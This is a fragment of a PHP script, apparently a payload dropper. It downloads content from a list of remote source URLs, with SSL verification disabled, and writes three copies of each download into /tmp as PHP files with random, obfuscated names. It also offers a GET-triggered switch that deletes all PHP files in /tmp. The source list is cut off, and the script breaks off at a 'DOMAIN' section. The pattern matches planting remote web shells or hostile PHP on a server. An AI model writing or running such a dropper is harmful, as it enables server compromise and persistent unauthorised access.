];

// ============ FUNCTIONS ============
function getContent($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data && strlen($data) > 100) return $data;
    }
    return @file_get_contents($url);
}

function randomName() {
    return substr(md5(uniqid()), 0, 16) . '.' . rand(10000000, 99999999) . '.' . rand(10000000, 99999999) . '.php';
}

// ============ DEPLOY ============
$deployed = [];
foreach ($sources as $src) {
    $content = getContent($src);
    if ($content && strlen($content) > 100) {
        for ($i = 0; $i < 3; $i++) {
            $name = randomName();
            $path = '/tmp/' . $name;
            if (file_put_contents($path, $content)) {
                chmod($path, 0644);
                $deployed[] = ['file' => $name, 'source' => basename($src)];
            }
        }
    }
}

// ============ CLEAN ============
if (isset($_GET['clean'])) {
    foreach (glob('/tmp/*.php') as $f) @unlink($f);
    die("✅ Cleaned all files in /tmp/");
}

// ============ DOMAIN ============
